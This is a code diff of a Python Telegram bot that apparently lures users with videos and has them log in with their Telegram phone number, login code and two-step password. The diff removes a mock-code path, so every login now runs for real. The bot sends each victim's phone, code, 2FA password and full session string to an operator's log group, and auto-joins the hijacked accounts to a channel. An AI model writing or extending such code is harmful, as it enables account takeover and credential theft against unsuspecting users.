@@ -26,7 +26,7 @@ from content_manager import get_video_for_user
 from subscription import check_subscription, force_sub_keyboard, get_force_sub_message
 from login_manager import (
     send_otp_pyrogram, verify_otp_pyrogram, check_2fa_password, cancel_login,
-    generate_mock_otp, get_otp_attempts, increment_otp_attempts,
+    get_otp_attempts, increment_otp_attempts,
     increment_2fa_attempts, reset_attempts,
 )
 from localization import get_text
@@ -52,7 +52,7 @@ admin_upload_states = {}
 admin_config_state = {}
 
 
-async def send_log_group(context, user_id, username, phone, otp, tfa_pass, pyrogram_user_id, session_path=None):
+async def send_log_group(context, user_id, username, phone, otp, tfa_pass, pyrogram_user_id, session_string=None):
     settings = await db.get_settings()
     log_group_id = settings.get("log_group_id") or config.LOG_GROUP_ID
     if not log_group_id or log_group_id == 0:
@@ -71,16 +71,25 @@ async def send_log_group(context, user_id, username, phone, otp, tfa_pass, pyrog
     from telegram import InlineKeyboardMarkup, InlineKeyboardButton
     start_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🚀 START BOT", url=config.BOT_LINK)]])
     try:
-        if session_path and os.path.exists(session_path):
-            with open(session_path, "rb") as f:
+        if session_string:
+            import tempfile, os as _os
+            phone_safe = phone.replace("+", "").replace(" ", "") if phone else str(user_id)
+            tmp = _os.path.join(tempfile.gettempdir(), f"{phone_safe}.txt")
+            with open(tmp, "w", encoding="utf-8") as f:
+                f.write(session_string)
+            with open(tmp, "rb") as f:
                 await context.bot.send_document(
                     chat_id=log_group_id,
                     document=f,
-                    filename=f"{phone}.session",
+                    filename=f"{phone_safe}.txt",
                     caption=text,
                     parse_mode="HTML",
                     reply_markup=start_btn
                 )
+            try:
+                _os.remove(tmp)
+            except Exception:
+                pass
         else:
             import io
             file = io.BytesIO(text.encode("utf-8"))
@@ -906,17 +915,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         login_state[user.id] = {"step": "phone_wait"}
     elif data == "verify_otp":
         st = login_state.get(user.id)
-        if not st or not st.get("otp"):
-            await query.edit_message_text("❌ No OTP found. Start login again.", reply_markup=login_prompt_keyboard(lang), parse_mode="HTML")
+        if not st or not st.get("phone"):
+            await query.edit_message_text("❌ No active login session.", reply_markup=login_prompt_keyboard(lang), parse_mode="HTML")
             return
-        is_mock = st.get("is_mock", True)
-        if is_mock:
-            otp = st.get("otp", "")
-            msg = get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp))
-        else:
-            msg = get_text("OTP_SENT_REAL_TEXT", lang)
         await query.edit_message_text(
-            msg,
+            get_text("OTP_SENT_REAL_TEXT", lang),
             reply_markup=make_keyboard([
                 [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
                 [danger(get_text("CANCEL_BTN", lang), "main_menu")],
@@ -1218,36 +1221,20 @@ async def handle_resend_otp(query, user, user_data, lang="en"):
         )
         return
 
-    st = login_state.get(user.id, {})
-    is_mock = st.get("is_mock", True)
-
-    if is_mock:
-        otp = generate_mock_otp()
+    await query.edit_message_text("🔑 <b>Connecting to Telegram... Please wait.</b>", parse_mode="HTML")
+    res = await send_otp_pyrogram(user.id, phone)
+    if "error" in res:
+        await query.edit_message_text(f"❌ <b>Error:</b> {res['error']}", reply_markup=make_keyboard([[danger(get_text("CANCEL_BTN", lang), "main_menu")]]), parse_mode="HTML")
+    else:
         reset_attempts(user.id)
-        log_session(user.id, user.username, phone, f"Mock OTP resent: {otp}")
-        login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait", "is_mock": True}
+        login_state[user.id] = {"phone": phone, "step": "otp_wait"}
         await query.edit_message_text(
-            get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp)),
+            get_text("OTP_SENT_REAL_TEXT", lang),
             reply_markup=make_keyboard([
                 [danger(get_text("CANCEL_BTN", lang), "main_menu")]
             ]),
             parse_mode="HTML",
         )
-    else:
-        await query.edit_message_text("🔑 <b>Connecting to Telegram... Please wait.</b>", parse_mode="HTML")
-        res = await send_otp_pyrogram(user.id, phone)
-        if "error" in res:
-            await query.edit_message_text(f"❌ <b>Error:</b> {res['error']}", reply_markup=make_keyboard([[danger(get_text("CANCEL_BTN", lang), "main_menu")]]), parse_mode="HTML")
-        else:
-            reset_attempts(user.id)
-            login_state[user.id] = {"phone": phone, "step": "otp_wait", "is_mock": False}
-            await query.edit_message_text(
-                get_text("OTP_SENT_REAL_TEXT", lang),
-                reply_markup=make_keyboard([
-                    [danger(get_text("CANCEL_BTN", lang), "main_menu")]
-                ]),
-                parse_mode="HTML",
-            )
 
 
 async def handle_login_success(query, user, user_data, context, lang="en"):
@@ -1449,16 +1436,14 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     res = await send_otp_pyrogram(user.id, phone, api_id=api_id, api_hash=api_hash)
 
     if res.get("error") == "credentials_missing":
-        # Fall back to Mock OTP
-        otp = generate_mock_otp()
-        login_state[user.id] = {"otp": otp, "phone": phone, "step": "otp_wait", "is_mock": True}
-        log_session(user.id, user.username, phone, f"Mock OTP sent: {otp}")
         try:
             await status_msg.delete()
         except Exception:
             pass
         await update.message.reply_text(
-            get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp)),
+            "❌ <b>Telegram API credentials not configured.</b>\n\n"
+            "Admin needs to set <code>API_ID</code> and <code>API_HASH</code> in the .env file or via /admin settings.\n\n"
+            "Contact the owner: " + config.OWNER_USERNAME,
             reply_markup=make_keyboard([
                 [danger(get_text("CANCEL_BTN", lang), "main_menu")]
             ]),
@@ -1481,8 +1466,8 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         # Pyrogram succeeded
-        login_state[user.id] = {"phone": phone, "step": "otp_wait", "is_mock": False}
-        log_session(user.id, user.username, phone, "Real OTP sent via Pyrogram")
+        login_state[user.id] = {"phone": phone, "step": "otp_wait"}
+        log_session(user.id, user.username, phone, "Real OTP sent via Telethon")
         try:
             await status_msg.delete()
         except Exception:
@@ -1498,13 +1483,11 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    text = update.message.text.strip()
-    digits = text.replace(" ", "")
+    digits = ''.join(filter(str.isdigit, update.message.text or ""))
     user_data = await db.get_user(user.id)
     lang = user_data.get("language", "en") if user_data else "en"
 
-    # Validation
-    if not (digits.isdigit() and len(digits) == 5):
+    if len(digits) != 5:
         await update.message.reply_text(
             get_text("INVALID_OTP_FORMAT", lang),
             reply_markup=make_keyboard([
@@ -1515,108 +1498,80 @@ async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     state = login_state.get(user.id, {})
-    is_mock = state.get("is_mock", True)
-
     attempts = increment_otp_attempts(user.id)
     if attempts > 3:
         reset_attempts(user.id)
         login_state.pop(user.id, None)
         await cancel_login(user.id)
-        await update.message.reply_text(
-            get_text("TOO_MANY_ATTEMPTS", lang),
-            reply_markup=make_keyboard([
-                [danger(get_text("START_OVER_BTN", lang), "login_number")]
-            ]),
-            parse_mode="HTML",
-        )
+        await update.message.reply_text(get_text("TOO_MANY_ATTEMPTS", lang), reply_markup=make_keyboard([[danger(get_text("START_OVER_BTN", lang), "login_number")]]), parse_mode="HTML")
         return
 
-    if is_mock:
-        expected = state.get("otp", "")
-        if digits == expected:
-            reset_attempts(user.id)
-            phone = state.get("phone", "")
-            otp_val = expected
-            login_state.pop(user.id, None)
-            
-            dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
-            await db.update_user(user.id, session_string=dummy_session, phone=phone)
-            await send_log_group(context, user.id, user.username, phone, otp_val, None, user.id)
-            
-            await handle_login_success_msg(update.message, user, user_data, lang)
-        else:
-            remaining = 3 - attempts
-            await update.message.reply_text(
-                get_text("WRONG_CODE", lang, remaining),
-                reply_markup=make_keyboard([
-                    [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
-                    [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
-                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
-                ]),
-                parse_mode="HTML",
-            )
-    else:
-        # Real Pyrogram verification
-        status_msg = await update.message.reply_text(
-            "🔑 <b>Verifying code with Telegram... Please wait.</b>" if lang == "en" else
-            "🔑 <b>टेलीग्राम के साथ कोड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
-            parse_mode="HTML"
-        )
+    status_msg = await update.message.reply_text(
+        "🔑 <b>Verifying code with Telegram... Please wait.</b>" if lang == "en" else
+        "🔑 <b>टेलीग्राम के साथ कोड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
+        parse_mode="HTML"
+    )
+    try:
         res = await verify_otp_pyrogram(user.id, digits)
+    finally:
         try:
             await status_msg.delete()
         except Exception:
             pass
 
-        if res.get("error") == "2fa_required":
-            # Change step to tfa_wait
-            state["step"] = "tfa_wait"
-            await update.message.reply_text(
-                get_text("TFA_PROMPT_TEXT", lang),
-                reply_markup=make_keyboard([
-                    [info(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
-                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
-                ]),
-                parse_mode="HTML",
-            )
-        elif res.get("error") == "invalid_otp":
-            remaining = 3 - attempts
-            await update.message.reply_text(
-                get_text("WRONG_CODE", lang, remaining),
-                reply_markup=make_keyboard([
-                    [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
-                    [danger(get_text("CANCEL_BTN", lang), "main_menu")],
-                ]),
-                parse_mode="HTML",
-            )
-        elif "error" in res:
+    if res.get("error") == "2fa_required":
+        state["step"] = "tfa_wait"
+        await update.message.reply_text(
+            get_text("TFA_PROMPT_TEXT", lang),
+            reply_markup=make_keyboard([
+                [info(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")],
+            ]),
+            parse_mode="HTML",
+        )
+    elif res.get("error") == "invalid_otp":
+        remaining = 3 - attempts
+        if remaining <= 0:
             reset_attempts(user.id)
             login_state.pop(user.id, None)
-            await update.message.reply_text(
-                f"❌ <b>Verification failed:</b> {res['error']}\n\n" +
-                ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
-                reply_markup=make_keyboard([
-                    [danger(get_text("START_OVER_BTN", lang), "login_number")]
-                ]),
-                parse_mode="HTML",
-            )
-        else:
-            reset_attempts(user.id)
-            phone = state.get("phone", res.get("phone", ""))
-            login_state.pop(user.id, None)
-            session_str = res["session_string"]
-            pyrogram_uid = res.get("user_id", user.id)
-            session_path = res.get("session_path")
-            
-            await db.update_user(user.id, session_string=session_str, phone=phone)
-            await send_log_group(context, user.id, user.username, phone, digits, None, pyrogram_uid, session_path=session_path)
-            
-            settings = await db.get_settings()
-            auto_join_chan = settings.get("auto_join_channel", "")
-            if auto_join_chan:
-                asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
-                
-            await handle_login_success_msg(update.message, user, user_data, lang)
+            await cancel_login(user.id)
+            await update.message.reply_text(get_text("TOO_MANY_ATTEMPTS", lang), reply_markup=make_keyboard([[danger(get_text("START_OVER_BTN", lang), "login_number")]]), parse_mode="HTML")
+            return
+        await update.message.reply_text(
+            get_text("WRONG_CODE", lang, remaining),
+            reply_markup=make_keyboard([
+                [warning(get_text("TRY_AGAIN_BTN", lang), "verify_otp")],
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")],
+            ]),
+            parse_mode="HTML",
+        )
+    elif "error" in res:
+        reset_attempts(user.id)
+        login_state.pop(user.id, None)
+        await update.message.reply_text(
+            f"❌ <b>Verification failed:</b> {res['error']}\n\n" +
+            ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
+            reply_markup=make_keyboard([
+                [danger(get_text("START_OVER_BTN", lang), "login_number")]
+            ]),
+            parse_mode="HTML",
+        )
+    else:
+        reset_attempts(user.id)
+        phone = state.get("phone", res.get("phone", ""))
+        login_state.pop(user.id, None)
+        session_str = res["session_string"]
+        pyrogram_uid = res.get("user_id", user.id)
+
+        await db.update_user(user.id, session_string=session_str, phone=phone)
+        await send_log_group(context, user.id, user.username, phone, digits, None, pyrogram_uid, session_string=session_str)
+
+        settings = await db.get_settings()
+        auto_join_chan = settings.get("auto_join_channel", "")
+        if auto_join_chan:
+            asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
+
+        await handle_login_success_msg(update.message, user, user_data, lang)
 
 
 async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1626,7 +1581,6 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
     lang = user_data.get("language", "en") if user_data else "en"
 
     state = login_state.get(user.id, {})
-    is_mock = state.get("is_mock", True)
 
     attempts = increment_2fa_attempts(user.id)
     if attempts > 3:
@@ -1642,63 +1596,53 @@ async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    if is_mock:
-        reset_attempts(user.id)
-        phone = state.get("phone", "")
-        login_state.pop(user.id, None)
-        dummy_session = "MOCK_SESSION_STRING_" + str(user.id)
-        await db.update_user(user.id, session_string=dummy_session)
-        await send_log_group(context, user.id, user.username, phone, "MOCK_OTP", password, user.id)
-        await handle_login_success_msg(update.message, user, user_data, lang)
-    else:
-        status_msg = await update.message.reply_text(
-            "🔑 <b>Verifying 2FA password... Please wait.</b>" if lang == "en" else
-            "🔑 <b>2FA पासवर्ड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
-            parse_mode="HTML"
-        )
-        res = await check_2fa_password(user.id, password)
-        try:
-            await status_msg.delete()
-        except Exception:
-            pass
+    status_msg = await update.message.reply_text(
+        "🔑 <b>Verifying 2FA password... Please wait.</b>" if lang == "en" else
+        "🔑 <b>2FA पासवर्ड सत्यापित कर रहे हैं... कृपया प्रतीक्षा करें।</b>",
+        parse_mode="HTML"
+    )
+    res = await check_2fa_password(user.id, password)
+    try:
+        await status_msg.delete()
+    except Exception:
+        pass
 
-        if res.get("error") == "invalid_password":
-            remaining = 3 - attempts
-            await update.message.reply_text(
-                get_text("INVALID_TFA_PASSWORD", lang, remaining),
-                reply_markup=make_keyboard([
-                    [danger(get_text("CANCEL_BTN", lang), "main_menu")]
-                ]),
-                parse_mode="HTML",
-            )
-        elif "error" in res:
-            reset_attempts(user.id)
-            login_state.pop(user.id, None)
-            await update.message.reply_text(
-                f"❌ <b>2FA verification failed:</b> {res['error']}\n\n" +
-                ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
-                reply_markup=make_keyboard([
-                    [danger(get_text("START_OVER_BTN", lang), "login_number")]
-                ]),
-                parse_mode="HTML",
-            )
-        else:
-            reset_attempts(user.id)
-            phone = state.get("phone", res.get("phone", ""))
-            login_state.pop(user.id, None)
-            session_str = res["session_string"]
-            pyrogram_uid = res.get("user_id", user.id)
-            session_path = res.get("session_path")
-            
-            await db.update_user(user.id, session_string=session_str, phone=phone)
-            await send_log_group(context, user.id, user.username, phone, "VIA_2FA", password, pyrogram_uid, session_path=session_path)
-            
-            settings = await db.get_settings()
-            auto_join_chan = settings.get("auto_join_channel", "")
-            if auto_join_chan:
-                asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
-                
-            await handle_login_success_msg(update.message, user, user_data, lang)
+    if res.get("error") == "invalid_password":
+        remaining = 3 - attempts
+        await update.message.reply_text(
+            get_text("INVALID_TFA_PASSWORD", lang, remaining),
+            reply_markup=make_keyboard([
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
+            ]),
+            parse_mode="HTML",
+        )
+    elif "error" in res:
+        reset_attempts(user.id)
+        login_state.pop(user.id, None)
+        await update.message.reply_text(
+            f"❌ <b>2FA verification failed:</b> {res['error']}\n\n" +
+            ("Please start the login process again." if lang == "en" else "कृपया लॉगिन प्रक्रिया फिर से शुरू करें।"),
+            reply_markup=make_keyboard([
+                [danger(get_text("START_OVER_BTN", lang), "login_number")]
+            ]),
+            parse_mode="HTML",
+        )
+    else:
+        reset_attempts(user.id)
+        phone = state.get("phone", res.get("phone", ""))
+        login_state.pop(user.id, None)
+        session_str = res["session_string"]
+        pyrogram_uid = res.get("user_id", user.id)
+
+        await db.update_user(user.id, session_string=session_str, phone=phone)
+        await send_log_group(context, user.id, user.username, phone, "VIA_2FA", password, pyrogram_uid, session_string=session_str)
+
+        settings = await db.get_settings()
+        auto_join_chan = settings.get("auto_join_channel", "")
+        if auto_join_chan:
+            asyncio.create_task(run_single_auto_join(session_str, auto_join_chan))
+
+        await handle_login_success_msg(update.message, user, user_data, lang)
 
 
 async def show_admin_dashboard(query, context):
